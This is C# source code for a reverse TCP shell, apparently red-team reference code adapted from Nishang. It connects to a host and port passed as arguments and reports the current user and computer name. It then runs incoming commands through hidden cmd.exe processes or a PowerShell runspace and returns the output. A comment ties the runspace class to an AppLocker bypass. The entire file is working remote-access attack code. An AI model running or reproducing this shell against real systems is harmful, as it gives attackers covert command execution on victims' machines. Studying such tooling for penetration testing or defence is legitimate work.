using System;
using System.Text;
using System.Net.Sockets;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Collections.ObjectModel;
using System.Diagnostics;

// reverse TCP shell with powershell runspace
// by @3xocyte
// originally based on https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
// this is reference code for other projects; I wouldn't recommend using it as-is
// Modified for arguments by Hodorsec

namespace TCPConnectConsole
{
    class Program
    {

        static void Main(string[] args)
        {
            try
            {
                if (args.Length != 2)
                {
                    Console.WriteLine("[!] No arguments, enter a host and a port");
                    System.Environment.Exit(-1);
                }
                
                string server = args[0];
                int port = Convert.ToInt32(args[1]);

                // create client and stream
                TcpClient client = new TcpClient(server, port);
                NetworkStream stream = client.GetStream();
                // send connection string
                string connectString = ("[*] running as " + Environment.GetEnvironmentVariable("username")
                    + " on " + Environment.GetEnvironmentVariable("computername")
                    + "\n[+] prepend \"psh \" to use PowerShell runspace"
                    + "\n[+] use \"exit\" to quit\n");
                byte[] connectBytes = Encoding.ASCII.GetBytes(connectString);
                stream.Write(connectBytes, 0, connectBytes.Length);
                stream.Flush();
                // send prompt
                string promptString = ("\nshell> ");
                byte[] promptBytes = Encoding.ASCII.GetBytes(promptString);
                stream.Write(promptBytes, 0, promptBytes.Length);
                stream.Flush();

                while (true)
                {
                    if (client.ReceiveBufferSize > 0) // either be 0 or 65536
                    {
                        // convert buffer to string, trim trailing null bytes before passing to runspace
                        byte[] data = new Byte[client.ReceiveBufferSize];
                        stream.Read(data, 0, client.ReceiveBufferSize);
                        string command = Encoding.ASCII.GetString(data).TrimEnd('\0');
                        // run command and get result, append prompt, convert to bytes and send back

                        // run powershell command
                        if (command.StartsWith("psh "))
                        {
                            command = command.Substring(4); // cut "psh "
                            string result = Pshell.RunPSCommand(command);
                            result += promptString;
                            byte[] returnBytes = Encoding.ASCII.GetBytes(result);
                            stream.Write(returnBytes, 0, returnBytes.Length);
                            stream.Flush();
                        }
                        // exit if asked
                        else if (command == "exit\n")
                        {
                            break;
                        }
                        // otherwise just use cmd (code is everywhere)
                        else
                        {
                            Process cmdProcess = new Process();
                            cmdProcess.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                            cmdProcess.StartInfo.CreateNoWindow = true;
                            cmdProcess.StartInfo.FileName = "cmd.exe";
                            cmdProcess.StartInfo.Arguments = "/C " + command;
                            cmdProcess.StartInfo.RedirectStandardOutput = true;
                            cmdProcess.StartInfo.RedirectStandardError = true;
                            cmdProcess.StartInfo.UseShellExecute = false;
                            cmdProcess.Start();
                            string output = cmdProcess.StandardOutput.ReadToEnd()
                                + cmdProcess.StandardError.ReadToEnd() + promptString;
                            byte[] outputBytes = Encoding.Default.GetBytes(output);
                            stream.Write(outputBytes, 0, outputBytes.Length);
                            stream.Flush();
                        }
                    }
                }
                client.Close();

            }
            catch
            {
                // not for prod obviously
                //Console.WriteLine("[!] error!");
                ;
            }
        }

        // this class shows up Casey Smith's scripts, eg the original MSBuild AppLocker bypass
        // Requires adding ref to System.Management.Automation.dll
        // a new runspace is created for every command so things like current working directory is not preserved
        public class Pshell
        {
            //Based on Jared Atkinson's And Justin Warner's Work
            public static string RunPSCommand(string cmd)
            {
                try
                {
                    //Init stuff
                    Runspace runspace = RunspaceFactory.CreateRunspace();
                    runspace.Open();
                    RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
                    Pipeline pipeline = runspace.CreatePipeline();

                    //Add commands
                    pipeline.Commands.AddScript(cmd);
                    //Prep PS for string output and invoke
                    pipeline.Commands.Add("Out-String");
                    Collection<PSObject> results = pipeline.Invoke();
                    runspace.Close();

                    //Convert records to strings
                    StringBuilder stringBuilder = new StringBuilder();
                    foreach (PSObject obj in results)
                    {
                        stringBuilder.Append(obj);
                    }
                    return stringBuilder.ToString().Trim();
                }
                catch
                {
                    string fail = "Failed";
                    return fail;
                }
            }

        }
    }
}
